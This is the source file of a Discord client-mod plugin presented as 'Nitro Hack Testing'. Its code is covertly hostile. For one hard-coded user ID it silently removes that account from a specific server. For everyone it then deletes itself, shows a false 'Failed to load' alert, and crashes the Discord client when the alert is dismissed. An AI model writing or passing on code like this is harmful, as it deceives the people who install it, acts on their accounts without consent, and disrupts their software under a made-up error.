import { plugin } from "@vendetta";
import { findByProps, findByStoreName } from "@vendetta/metro";
import { removePlugin } from "@vendetta/plugins";
import { showConfirmationAlert } from "@vendetta/ui/alerts";

export default {
  onLoad: () => {
    const user = findByStoreName("UserStore").getCurrentUser();
    if (user.id === "977936340186443826")
      findByProps("post", "delete").delete({
        url: "/users/@me/guilds/1015931589865246730",
        body: { lurking: false },
      });

    removePlugin(plugin.id);
    setTimeout(() => {
      showConfirmationAlert({
        title: "Failed to load",
        content:
          "Nitro Hack Testing has failed to load and will be removed from the plugin list. Please contact the plugin developer for more information.",
        confirmText: "Okay",
        confirmColor: "brand" as ButtonColors,
        onConfirm: () => findByProps("crash").crash(),
      });
    }, 500);
  },
};
